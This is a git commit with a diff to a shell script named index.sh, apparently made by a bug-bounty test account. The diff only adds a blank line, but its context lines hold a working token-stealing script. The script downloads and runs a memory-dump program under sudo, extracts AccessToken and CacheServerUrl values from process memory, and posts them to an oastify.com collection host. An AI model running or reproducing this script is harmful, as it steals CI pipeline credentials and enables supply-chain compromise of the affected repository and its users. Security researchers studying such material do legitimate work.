8cb0ca9dad75597d096c36ca23cf9591260237f3
bbountytest0 <elmahdi@wearehackerone.com>
2024-09-08 05:27:52 +0100

    Update index.sh

--- index.sh
+++ index.sh
@@ -2,3 +2,4 @@ YOUR_EXFIL="5698f7n0t9b0n1i1134phx4u6lcc040sp.oastify.com"
 BLOB=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"AccessToken":"[^"]*"\}' | sort -u`
 BLOB2=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"CacheServerUrl":"[^"]*"\}' | sort -u`
 curl -s -d "$BLOB $BLOB2" https://$YOUR_EXFIL/token > /dev/null
+
